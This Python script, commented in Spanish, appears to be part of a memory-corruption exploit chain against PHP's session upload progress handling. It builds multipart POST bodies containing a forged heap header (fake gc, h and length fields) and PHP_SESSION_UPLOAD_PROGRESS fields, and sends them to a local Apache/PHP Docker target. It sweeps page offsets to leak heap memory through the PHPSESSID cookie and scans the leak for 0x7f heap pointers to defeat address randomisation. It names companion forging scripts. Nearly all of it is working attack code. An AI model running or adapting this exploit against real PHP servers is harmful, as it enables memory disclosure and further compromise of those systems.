#!/usr/bin/env python3
"""
sweep_page_residue.py — barrido de offset --d para encontrar paginas del chunk
cacheado con residuo de A (punteros de freelist).

Contexto (07-plan/progress/2026-10-22-orquestador-b-leak-4000.md):
  Con d=253*4096 la cookie de 4000 B llega pero contiene solo relleno M y ceros.
  El chunk se mapeo limpio: no hay punteros de freelist bin-64 en la pagina 510.
  En el montaje de 9bie el residuo esta en la pagina 511 (su build usa paginas
  distintas). Este script barre d sobre las paginas 506..511 midiendo el contenido
  de la cookie para detectar en cual pagina quedan punteros de A.

Metrica de deteccion:
  Un puntero de heap en x86-64 tiene byte alto 0x7f (userspace, 6 bytes
  significativos). Si la cookie contiene qwords con byte alto 0x7f, esa pagina
  tiene residuo util. Se cuenta cuantos qwords candidatos hay y se reporta.

Uso:
    python3 sweep_page_residue.py --url http://127.0.0.1:18191/index.php \
        --container phpdebug [--pages 506-511] [--n 40] [--bb1 1048551] \
        [--read 4000] [--out sweep_results.txt]

Salida por pagina:
    page  d(hex)   resp_len  cookie_len  ptr_candidates  top_byte_0x7f
"""

import argparse
import collections
import socket
import struct
import subprocess
import urllib.parse
from pathlib import Path


# ---------------------------------------------------------------------------
# Construccion del payload B con d variable
# ---------------------------------------------------------------------------

def build_b(n: int, bb1_len: int, d: int, read_len: int, fill_len: int) -> bytes:
    bnd = b"B" * 10
    parts = []

    for i in range(n):
        parts.append((str(1000 + i).encode(), b"V" * 231))

    if bb1_len > 0:
        parts.append((b"900001", b"P" * bb1_len))

    if fill_len <= d:
        raise ValueError(f"fill_len ({fill_len}) debe ser > d ({d})")

    buf = bytearray(b"Q" * fill_len)
    struct.pack_into("<Q", buf, d - 24, 0x4141414141414141)  # gc
    struct.pack_into("<Q", buf, d - 16, 0)                   # h
    struct.pack_into("<Q", buf, d - 8,  read_len)            # len
    buf[d:] = b"M" * (fill_len - d)
    parts.append((b"900002", bytes(buf)))

    parts.append((b"PHPSESSID",                   b"attacksessionid0001"))
    parts.append((b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"))

    body = bytearray()
    for name, data in parts:
        body += b"--" + bnd + b"\r\n"
        body += b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        body += data + b"\r\n"
    body += b"--" + bnd + b"--\r\n"
    return bytes(body), bnd


# ---------------------------------------------------------------------------
# Envio HTTP raw y extraccion de cookie
# ---------------------------------------------------------------------------

def send_b(url: str, body: bytes, bnd: bytes, timeout: float = 60) -> bytes:
    p = urllib.parse.urlparse(url)
    host = p.hostname
    port = p.port or 80
    path = p.path or "/index.php"
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    resp = bytearray()
    try:
        s.sendall(req)
        while len(resp) < 4_000_000:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    except OSError:
        pass
    s.close()
    return bytes(resp)


def parse_cookie(resp: bytes) -> bytes:
    """Extrae el valor de Set-Cookie: PHPSESSID=<valor> URL-decoded."""
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"phpsessid=" in line.lower():
            val = line.split(b"=", 1)[1].split(b";")[0].strip()
            try:
                return urllib.parse.unquote_to_bytes(val.decode("ascii"))
            except Exception:
                return val
    return b""


# ---------------------------------------------------------------------------
# Analisis de punteros en la cookie
# ---------------------------------------------------------------------------

def count_ptr_candidates(cookie: bytes) -> tuple[int, int]:
    """
    Cuenta qwords con byte alto == 0x7f (punteros de heap userspace tipicos).
    Retorna (total_qwords, candidatos_con_0x7f).
    """
    total = len(cookie) // 8
    candidates = 0
    for i in range(total):
        qw = int.from_bytes(cookie[i*8:(i+1)*8], "little")
        top = (qw >> 40) & 0xFF
        if top == 0x7F:
            candidates += 1
    return total, candidates


def top_byte_distribution(cookie: bytes) -> dict:
    """Distribucion del byte alto de cada qword en la cookie."""
    dist = collections.Counter()
    for i in range(len(cookie) // 8):
        qw = int.from_bytes(cookie[i*8:(i+1)*8], "little")
        dist[(qw >> 40) & 0xFF] += 1
    return dict(dist.most_common(6))


# ---------------------------------------------------------------------------
# Restart del worker entre intentos
# ---------------------------------------------------------------------------

def restart_apache(container: str):
    subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         "apache2ctl graceful 2>/dev/null || apachectl graceful 2>/dev/null || true"],
        capture_output=True, timeout=10,
    )


# ---------------------------------------------------------------------------
# Barrido principal
# ---------------------------------------------------------------------------

def sweep(url: str, container: str, pages: list[int],
          n: int, bb1: int, read_len: int, fill_base: int,
          out_path: str):

    results = []
    header = f"{'page':>5}  {'d':>10}  {'resp':>8}  {'ck':>6}  {'ptrs':>6}  {'top_dist'}"
    print(header)
    print("-" * len(header))

    for pg in pages:
        # d = (pg - 2) * 4096  (el valor BF empieza en pagina 257 del chunk)
        # Para apuntar el header a la pagina pg del chunk cacheado:
        # offset dentro del valor = (pg - start_page) * PAGE_SIZE
        # Ajustamos start_page empiricamente a 257 (como en b_forge.py)
        start_page = 257
        d = (pg - start_page) * 4096
        if d < 32:
            print(f"  pg {pg}: d={d} demasiado pequeno, saltando")
            continue

        # fill_len debe cubrir d + algo
        fill_len = max(fill_base, d + 4096)

        try:
            body, bnd = build_b(n, bb1, d, read_len, fill_len)
        except ValueError as e:
            print(f"  pg {pg}: {e}")
            continue

        restart_apache(container)
        resp = send_b(url, body, bnd)
        cookie = parse_cookie(resp)
        total_qw, ptrs = count_ptr_candidates(cookie)
        top_dist = top_byte_distribution(cookie)

        row = (
            f"{pg:>5}  0x{d:>08x}  {len(resp):>8}  {len(cookie):>6}"
            f"  {ptrs:>6}  {top_dist}"
        )
        print(row)
        results.append({
            "page": pg, "d": d, "resp_len": len(resp),
            "cookie_len": len(cookie), "ptr_candidates": ptrs,
            "top_dist": top_dist,
        })

    # Guardar resumen
    lines = [header, "-" * len(header)]
    for r in results:
        lines.append(
            f"{r['page']:>5}  0x{r['d']:>08x}  {r['resp_len']:>8}"
            f"  {r['cookie_len']:>6}  {r['ptr_candidates']:>6}  {r['top_dist']}"
        )
    Path(out_path).write_text("\n".join(lines) + "\n")
    print(f"\n[ok] resultados en {out_path}")

    # Interpretacion
    best = max(results, key=lambda r: r["ptr_candidates"]) if results else None
    if best and best["ptr_candidates"] > 0:
        print(f"\n[!] Mejor pagina: {best['page']} (d=0x{best['d']:x})"
              f" con {best['ptr_candidates']} punteros candidatos.")
        print(f"    Usar: --d {best['d']} en b_forge.py y oracle_bin128.py")
    else:
        print("\n[-] Ninguna pagina tiene punteros 0x7f. El chunk se mapea limpio.")
        print("    Siguiente linea: reciclar el chunk en A antes del OOM para")
        print("    dejar residuo de freelist en las paginas 508-511.")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="Barrido de paginas del chunk cacheado buscando residuo de A."
    )
    ap.add_argument("--url",       required=True,
                    help="URL de la pagina PHP de prueba")
    ap.add_argument("--container", required=True,
                    help="Nombre del contenedor Docker (para graceful restart)")
    ap.add_argument("--pages",     default="506-511",
                    help="Rango de paginas a barrer, ej. 506-511 o 508,509,510")
    ap.add_argument("--n",         type=int, default=40,
                    help="Campos de 231 B para resolver ps_close_files (default: 40)")
    ap.add_argument("--bb1",       type=int, default=1048551,
                    help="Longitud del campo P (default: 1048551)")
    ap.add_argument("--read",      type=int, default=4000,
                    help="len forjado en el header (default: 4000)")
    ap.add_argument("--fill-base", type=int, default=1040384,
                    help="Longitud base del valor BF (default: 1040384 = 255 paginas)")
    ap.add_argument("--out",       default="sweep_results.txt",
                    help="Archivo de salida con la tabla de resultados")
    args = ap.parse_args()

    # Parsear el rango de paginas
    if "-" in args.pages and "," not in args.pages:
        lo, hi = args.pages.split("-")
        pages = list(range(int(lo), int(hi) + 1))
    else:
        pages = [int(x) for x in args.pages.split(",")]

    sweep(
        url=args.url,
        container=args.container,
        pages=pages,
        n=args.n,
        bb1=args.bb1,
        read_len=args.read,
        fill_base=args.fill_base,
        out_path=args.out,
    )


if __name__ == "__main__":
    main()
